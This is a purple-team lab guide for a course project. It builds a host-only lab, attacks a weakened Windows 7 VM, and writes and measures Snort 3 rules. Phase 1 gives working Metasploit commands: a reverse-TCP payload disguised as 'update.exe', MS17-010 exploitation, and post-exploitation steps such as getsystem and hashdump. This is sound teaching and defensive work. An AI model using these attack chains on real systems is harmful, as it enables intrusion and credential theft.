# Purple Team Lab — Build Guide

**Project 2 — Exploitation, Detection Engineering & IDS Evaluation**

Working guide. Follow it phase by phase; everything you capture feeds the final
report and the repository.

Repository root: `D:\Project-2-Purple-Team-Lab`

> **Revision note.** This guide was rewritten after the lab was built. The original
> plan called for a dedicated Ubuntu 20.04 sensor running Snort 2.9. That was
> abandoned — see [Design decisions](#design-decisions) for why, and what replaced
> it. The reasoning belongs in the report; changing plans in response to real
> constraints is engineering, not failure.

---

## Contents

- [Design decisions](#design-decisions)
- [Confirmed lab facts](#confirmed-lab-facts)
- [Phase 0 — Lab construction](#phase-0--lab-construction)
- [Phase 1 — Attack chains](#phase-1--attack-chains)
- [Phase 2 — Detection engineering](#phase-2--detection-engineering)
- [Phase 3 — Measurement](#phase-3--measurement)
- [Phase 4 — Research report](#phase-4--research-report)
- [Evidence checklist](#evidence-checklist)
- [Troubleshooting log](#troubleshooting-log)

---

## Design decisions

Three deviations from both the original plan and the SIT182 task sheets. Each is
deliberate, and each belongs in the methodology section of the report.

### 1. Host-only networking instead of bridged

Tasks 4.4HD and 8.2HD both instruct the use of a Bridged Adapter. That places a
deliberately unpatched Windows 7 host, with the firewall off and Defender disabled,
directly onto the home LAN. Host-only confines every packet to the hypervisor.

The victim has exactly one adapter, host-only, and no route anywhere else. Kali has
a second NAT adapter for package installation which is **disabled during all attack
runs** so captures contain lab traffic only.

### 2. Two VMs, with Snort on Kali — not a dedicated sensor

The intended design used a third Ubuntu VM as an independent sensor watching the
segment in promiscuous mode. That was abandoned because the host runs
Virtualization-Based Security, which holds the CPU's VT-x extensions. VirtualBox
therefore falls back to the NEM backend:

```
HM: HMR3Init: Attempting fall back to NEM: VT-x is not available
```

Under NEM the Ubuntu installer would not complete. Disabling VBS on the host was
possible but was declined as an unnecessary reduction of host security posture for a
lab exercise.

**Consequence, stated honestly:** the IDS is not an independent out-of-band sensor.
It runs on Kali, which is also the attacking host. Kali is an endpoint of every
attack, so it observes all relevant traffic — but this is a real limitation and is
recorded as such in the report's limitations section. A production deployment would
use a SPAN port or network TAP.

### 3. Snort 3, not Snort 2.9

Task 8.2HD is built around Snort 2.9, which is end-of-life and was dropped from
Debian and Ubuntu archives. Kali ships **Snort 3.12.2.0** natively. Snort 3 is what
is actually deployed in 2026, so this is a modernisation rather than a compromise.

Practical differences: configuration is `snort.lua` rather than `snort.conf`, rule
syntax differs slightly, and Snort 3 offers a native JSON alert output that makes
programmatic analysis far cleaner.

---

## Confirmed lab facts

Verified on this machine — do not re-derive.

| Item | Value |
|---|---|
| Host | Windows 11 Home, 31.5 GB RAM, VirtualBox 7.2.12 |
| Host virtualisation | VBS active; VirtualBox running on NEM, not native VT-x |
| Attacker / sensor | Kali, user `mannraj`, `eth0` = `192.168.56.10` (static), `eth1` = NAT (updates only) |
| IDS | Snort 3.12.2.0, DAQ 3.0.24, libpcap 1.10.5 |
| Victim | Windows 7 SP1 (build 6.1.7601), **32-bit**, Administrator access |
| Victim source | `IE8 - Win7.ova`, Microsoft developer image, 5.3 GB |
| Host-only network | `192.168.56.0/24`, DHCP disabled |
| Ubuntu ISO | `D:\ISOs\ubuntu-20.04.6-live-server-amd64.iso`, SHA-256 verified — unused, retained |

**The victim being 32-bit is the single most consequential fact here.** It dictates
payload architecture in Phase 1 and rules out the standard EternalBlue module.

---

## Phase 0 — Lab construction

### Topology

```
Windows 11 host (VirtualBox)
│
├── Kali          192.168.56.10   attacker + Snort 3 sensor
└── Win7-Victim   192.168.56.20   victim (32-bit, unpatched)
                  │
                  └── host-only 192.168.56.0/24, DHCP off, no route out
```

### Step 0.1 — Host-only network ✅

`192.168.56.1`, mask `255.255.255.0`, adapter configured manually, DHCP disabled.

Note there is a second host-only adapter (`...Adapter #2`, `169.254.x`) unrelated to
this lab. Always attach VMs to **`VirtualBox Host-Only Ethernet Adapter`** — the one
without the `#2`.

### Step 0.2 — Kali ✅

- Adapter 1 → Host-only, `eth0`, static `192.168.56.10/24`
- Adapter 2 → NAT, `eth1`, DHCP (`10.0.3.15`) — **disable before every attack run**
- Snort 3.12.2.0 installed

If `eth1` ever stops resolving DNS, check it has not been left with a static address
from a previous bridged configuration — see the [troubleshooting log](#troubleshooting-log).

### Step 0.3 — Windows 7 victim

Import `IE8 - Win7.ova` with Machine Base Folder on `D:\VMs` and a regenerated MAC
address.

**Before first boot — Settings → Network:**
- Adapter 1 → Host-only Adapter, `VirtualBox Host-Only Ethernet Adapter`
- Adapters 2–4 → disabled

Task 3.1P had this VM fully air-gapped for malware analysis. We need Kali to reach
it, so host-only replaces "no network" — equally contained, but reachable from the
attacker.

**Static IP** — Control Panel → Network and Sharing Center → Change adapter settings
→ Properties → IPv4:
- IP `192.168.56.20`, mask `255.255.255.0`
- **Gateway blank, DNS blank** — deliberate second layer of containment

### Step 0.4 — Weaken the victim, logging every change

Each item below becomes part of the target configuration in the methodology.

- Windows Firewall off, all profiles — `netsh advfirewall set allprofiles state off`
- Windows Defender disabled
- File and Printer Sharing enabled (this is what makes port 445 listen)
- UAC → Never notify (`msconfig` → Tools → Change UAC Settings)
- Windows Update disabled, no patches
- `systeminfo > C:\sysinfo.txt` — retain as evidence

### Step 0.5 — Connectivity checkpoint

From Kali:

```
ping -c3 192.168.56.20
sudo nmap -p 139,445 192.168.56.20
```

Port 445 must be **open**. If it is not, Chain B has nothing to attack — recheck the
firewall and File and Printer Sharing.

### Step 0.6 — Snapshots

| Snapshot | When | Purpose |
|---|---|---|
| `clean-baseline` | After import, before any change | Untouched fallback; eval licence reset |
| `ready-to-infect` | After Step 0.4 | **Restored before every attack run** |

`ready-to-infect` is the working state. Every measured run starts from it, so no run
is contaminated by residue from the previous one.

### Step 0.7 — Baseline capture

With Kali's NAT adapter **disabled**:

```
sudo mkdir -p /captures
sudo tcpdump -i eth0 -w /captures/baseline-clean.pcap
```

Generate 10–15 minutes of benign traffic: pings both directions, browsing from the
victim to Apache on Kali, an SMB share listing, idle time. Then Ctrl-C.

This is the **false-positive control**. Every rule written in Phase 2 is replayed
against it. A rule that fires here is a rule that would bury a real SOC. Without this
file there is no false-positive rate, and the measurement half of the project has
nothing to stand on.

---

## Phase 1 — Attack chains

Covers **Task 4.4HD**. Restore `ready-to-infect` before each run. Kali's NAT adapter
off. Start the capture *before* the attack:

```
sudo tcpdump -i eth0 -w /captures/chainA-run1-$(date +%Y%m%d-%H%M%S).pcap
```

Record the wall-clock start time — detection latency in Phase 3 depends on it.

### Chain A — social-engineered payload

**A1. Reconnaissance**

```
sudo nmap -sn 192.168.56.0/24
sudo nmap -sS -sV -p- 192.168.56.20 -oN /captures/recon-full.txt
```

**A2. Payload — 32-bit, not x64**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /var/www/html/update.exe
sha256sum /var/www/html/update.exe
```

The victim is 32-bit. `windows/x64/meterpreter/reverse_tcp` will connect and die
immediately. Record the hash — the repository ships the hash, never the binary.

**A3. Delivery**

```
sudo systemctl start apache2
```

**A4. Handler**

```
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
set ExitOnSession false
exploit -j
```

**A5. Execution** — on the victim, browse to `http://192.168.56.10/update.exe`,
download, run.

**A6. Post-exploitation**

```
sessions -i 1
sysinfo
getuid
ps
migrate <explorer.exe PID>
getsystem
getuid
hashdump
screenshot
shell
```

Capture `getuid` both before and after `getsystem` — that pair is the privilege
escalation evidence.

### Chain B — MS17-010

**B1. Confirm vulnerability**

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.56.20
run
```

**B2. Exploit — `psexec`, not `eternalblue`**

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 192.168.56.20
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 5555
check
exploit
```

`ms17_010_eternalblue` targets x64 Windows 7 and Server 2008 R2 and is unreliable
against this 32-bit target. `ms17_010_psexec` exploits the same vulnerability in a
way that works on x86. Same CVE, same detection story, a module that actually lands.

Port 5555 differs deliberately from Chain A's 4444 — two distinct C2 channels, which
Phase 2 uses to demonstrate why port-specific signatures are brittle.

**B3.** Same post-exploitation sequence as Chain A.

### Chain C — IE8 browser exploit (optional)

This image exists as an Internet Explorer 8 test VM, making browser exploitation its
natural attack surface. A drive-by compromise is closer to real initial access than
SMB worming and produces distinctive HTTP traffic.

Browser exploits are fussy. Attempt this only once Chains A and B are landing
reliably. A documented failed attempt is still worth writing up.

---

## Phase 2 — Detection engineering

Covers **Task 8.2HD**, using Snort 3.

### Step 2.1 — Configure

Edit `/etc/snort/snort.lua`:

```lua
HOME_NET = '192.168.56.0/24'
EXTERNAL_NET = 'any'
```

**A design point worth raising in the report:** in a flat lab both attacker and
victim sit inside `HOME_NET`, so the conventional `$EXTERNAL_NET -> $HOME_NET`
direction that most public rulesets assume does not apply. Rules here key on
behaviour and content rather than on network direction. That is a genuine and
non-obvious difference between lab detection and production detection.

### Step 2.2 — Prove the pipeline

`/etc/snort/rules/local.rules`:

```
alert tcp any any -> any any ( msg:"LAB-TEST TCP connection detected"; sid:1000000; rev:1; )
```

Validate before running — Snort 3 has a config test mode:

```
sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules --warn-all -T
```

Run live:

```
sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -i eth0 -A alert_fast -l /var/log/snort -s 65535 -k none
```

Generate traffic, confirm alerts. **This answers 8.2HD Q3.**

This rule is deliberately awful — it fires on every TCP packet. Keep the screenshot,
then say so in the report: it proves the pipeline works while demonstrating exactly
the alert fatigue that makes real SOCs miss real intrusions.

### Step 2.3 — The real ruleset

Task Q4 asks for two rules. Write six, each targeting traffic your own attacks
produced. SIDs from 1,000,001 up.

**Treat what follows as starting points, not finished signatures.** Tune each one
against your own pcaps — that iteration *is* detection engineering, and the tuning
notes are report material.

```
# 1 — host discovery sweep
alert icmp any any -> $HOME_NET any ( msg:"LAB-RECON ICMP echo request burst";
  itype:8; detection_filter:track by_src, count 15, seconds 5;
  sid:1000001; rev:1; )

# 2 — TCP SYN scan
alert tcp any any -> $HOME_NET any ( msg:"LAB-RECON TCP SYN scan";
  flags:S,12; detection_filter:track by_src, count 30, seconds 5;
  sid:1000002; rev:1; )

# 3 — executable delivered over HTTP
alert http any any -> any any ( msg:"LAB-DELIVERY executable download over HTTP";
  flow:to_server,established; http_uri; content:".exe", nocase;
  sid:1000003; rev:1; )

# 4 — C2 callback, port-specific (deliberately brittle — see below)
alert tcp $HOME_NET any -> $HOME_NET 4444 ( msg:"LAB-C2 Meterpreter callback to 4444";
  flow:to_server; sid:1000004; rev:1; )

# 5 — SMBv1 Trans2, possible MS17-010
alert tcp any any -> $HOME_NET 445 ( msg:"LAB-EXPLOIT SMBv1 Trans2 request";
  flow:to_server,established; content:"|FF|SMB|32|", offset 4, depth 5;
  sid:1000005; rev:1; )

# 6 — PE header over a non-HTTP channel, possible Meterpreter stage
alert tcp $HOME_NET any -> $HOME_NET any ( msg:"LAB-C2 PE header on non-HTTP channel";
  flow:established; content:"MZ", depth 2;
  content:"This program cannot be run in DOS mode";
  sid:1000006; rev:1; )
```

**Rule 4 is intentionally fragile.** It matches port 4444 only, so Chain B on port
5555 walks straight past it. Demonstrate that failure, then write a port-agnostic
replacement. That contrast — a signature that looked fine until the adversary changed
one number — is the most valuable single result this project can produce, and it is
entirely your own data.

Screenshot the rules firing. **That answers 8.2HD Q4.**

### Step 2.4 — Offline replay

You never need to re-run an attack to test a rule:

```
snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -r /captures/chainA-run1.pcap -A alert_fast -s 65535
```

Iterate in seconds instead of rebuilding VMs. This is also how anyone cloning the
repository reproduces your results, which is what 10.2HD's "attach your raw data"
requirement is really asking for.

For machine-readable output feeding Phase 3:

```
snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -r /captures/chainA-run1.pcap -A alert_json -l /var/log/snort
```

---

## Phase 3 — Measurement

For each rule, replay every attack pcap **and** `baseline-clean.pcap`, recording:

- **True positives** — fired on the traffic it targets?
- **False positives** — fired on the clean baseline? How many?
- **Detection latency** — first attack packet to first alert
- **Alert volume** — a rule firing 40,000 times is useless even when correct

Then a coverage map: which stages of each attack chain were detected, and which
passed silently.

**The gaps matter more than the hits.** Expect post-exploitation inside an
established session to be largely invisible to signature matching — it is bytes on
an already-open socket. That finding drives the Discussion.

I will write `scripts/parse_alerts.py` and `scripts/replay_and_score.py` to turn the
JSON alert output into `results/detection_metrics.csv` and charts once you hand over
the raw logs.

---

## Phase 4 — Research report

**Task 10.2HD, Option 3.** 2,500–3,000 words, IEEE referencing.

**Title:** *Detecting Post-Exploitation Command-and-Control: An Experimental
Evaluation of Signature-Based Intrusion Detection Against Meterpreter Reverse-TCP and
MS17-010 Exploitation*

**Research question:** To what extent can signature-based network intrusion detection
identify the stages of a Meterpreter-based intrusion, and where does it fail?

| Section | Content | Words |
|---|---|---|
| Introduction | Threat, research question, significance | ~350 |
| Methodology | Lab as apparatus, both chains, ruleset design, measurement approach | ~600 |
| Results | Detection table, latency, false positives, charts | ~600 |
| Discussion | Where detection held and where it broke, and why | ~800 |
| Conclusion | Findings, limitations, future work | ~350 |
| References | IEEE, 12–15 credible sources | — |
| Appendices | Ruleset, repository link for pcaps and logs | — |

**Discussion themes carrying the 20 critical-analysis marks:**

- Signature detection covers delivery and exploitation well, degrades sharply against
  post-exploitation inside an established session
- Rule 4 failing on Chain B — signature brittleness demonstrated with your own data,
  not a citation
- Encryption and payload encoding defeat content matching outright; testable if time
  allows
- Behavioural detection as complement rather than replacement, with an honest account
  of its own false-positive cost
- Detection latency versus response capability: what does a 3-second detection buy a
  defender who cannot act for 30 minutes?

**Limitations to state plainly:** single victim OS and architecture, sensor not
independent of the attacking host, no encrypted C2 tested, small number of runs, lab
traffic far cleaner than production, no evasion attempted.

---

## Evidence checklist

**Phase 0**
- [ ] Topology diagram
- [ ] `ip a` on Kali (**8.2HD Q2**), `ipconfig /all` on the victim
- [ ] `systeminfo` and `wmic os get osarchitecture` from the victim
- [ ] Complete list of weakening changes
- [ ] `nmap -p 445` confirming the attack surface is exposed
- [ ] Snapshot names and what each represents
- [ ] `baseline-clean.pcap`

**Phase 1**
- [ ] Every command as copy-pasted text, not only screenshots
- [ ] `msfvenom` command and payload SHA-256
- [ ] A pcap per run, consistently named, with wall-clock start times
- [ ] Screenshots: session established, `getuid` before/after `getsystem`, `sysinfo`, `hashdump`
- [ ] Nmap output files
- [ ] Screencast of both chains
- [ ] Reflection notes written same-day (**4.4HD Q2**)

**Phase 2**
- [ ] `snort.lua` diff against stock
- [ ] Final `local.rules`, commented
- [ ] Alert logs from every run, text and JSON
- [ ] Console screenshots of rules firing
- [ ] Notes on every rule that did *not* work, and why

**Phase 3**
- [ ] Replay output, all rules against all pcaps
- [ ] False-positive counts from the clean baseline
- [ ] Latency measurements

Copy into `D:\Project-2-Purple-Team-Lab\` as you go — pcaps to `pcaps\`, logs to
`logs\`, screenshots to `docs\screenshots\`. Commit after each phase.

---

## Troubleshooting log

Problems actually hit during this build, with resolutions. This is report material —
a lab-build section that admits what broke reads as experience.

**Ubuntu installer hung at `vmw_host_log` errors**
Not a graphics problem despite appearances. Host VBS held VT-x, so VirtualBox fell
back to NEM and the installer could not complete. `nomodeset`, video memory increases,
single-CPU and paravirtualisation changes all failed. Root cause confirmed in
`VBox.log`: `HM: HMR3Init: Attempting fall back to NEM: VT-x is not available`.
Resolved by abandoning the third VM rather than disabling host security.

**Kali DNS failed with a NAT adapter attached**
`Temporary failure resolving 'http.kali.org'` despite a valid-looking route. The
NetworkManager profile still carried a static `192.168.1.10` address and
`192.168.1.1` gateway from an earlier bridged configuration. A NAT adapter cannot
route an address from a network it does not serve. Fixed with
`nmcli con mod "Wired connection 1" ipv4.method auto ipv4.addresses "" ipv4.gateway ""`,
after which DHCP returned `10.0.3.15` (slot 2 → `10.0.3.x`; slot 1 would be
`10.0.2.x`).

**Kali `eth0` drifted to `192.168.56.104`**
Left over from before DHCP was disabled on the host-only network. Pinned with
`nmcli con mod hostonly ipv4.method manual ipv4.addresses 192.168.56.10/24`. An
address that moves between reboots invalidates rules and pcap filters — pin it early.

**Two host-only adapters present**
`VirtualBox Host-Only Ethernet Adapter #2` on `169.254.x` is unrelated to this lab.
Attaching a VM to it produces a machine that cannot reach anything while every
setting looks correct.

---

## When you are done

Hand over the collected evidence and I will build out the repository: documentation
set, analysis tooling, metrics and charts, tests, finished README, commit history,
and a mirrored backup on D:.
